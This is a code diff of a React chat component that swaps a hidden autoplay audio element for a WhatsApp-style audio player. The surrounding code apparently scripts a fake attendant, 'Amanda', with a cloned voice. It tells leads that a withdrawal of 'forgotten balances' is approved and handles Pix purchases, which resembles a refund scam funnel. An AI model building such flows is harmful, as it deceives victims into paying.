@@ -79,7 +79,6 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   const [buyPixError, setBuyPixError] = useState<string>("");
   
   const [audioUrl, setAudioUrl] = useState<string | null>(null);
-  const audioRef = useRef<HTMLAudioElement | null>(null);
   
   const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });
   const [waNumber, setWaNumber] = useState("5511971730325");
@@ -372,11 +371,6 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           setTimeout(() => {
             setTyping(false);
             addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, `/assets/banners/banner_atencao.png?v=${Date.now()}`, undefined, localAudioUrl);
-            
-            if (localAudioUrl && audioRef.current) {
-               audioRef.current.src = localAudioUrl;
-               audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
-            }
             
             setTimeout(() => {
               setTyping(true);
@@ -737,7 +731,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                   ) : (
                     <>
                       {msg.audio && (
-                         <audio src={msg.audio} controls autoPlay className="w-full h-10 mb-3 outline-none" />
+                         <WhatsAppAudioPlayer src={msg.audio} attendantName={attendant.name} />
                       )}
                       {msg.image && (
                          <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
@@ -803,11 +797,6 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           </motion.div>
         )}
       </AnimatePresence>
-
-      {/* Audio Player Oculto para autoplay e controle */}
-      {audioUrl && (
-         <audio ref={audioRef} style={{ display: 'none' }} />
-      )}
     </div>
   );
 }
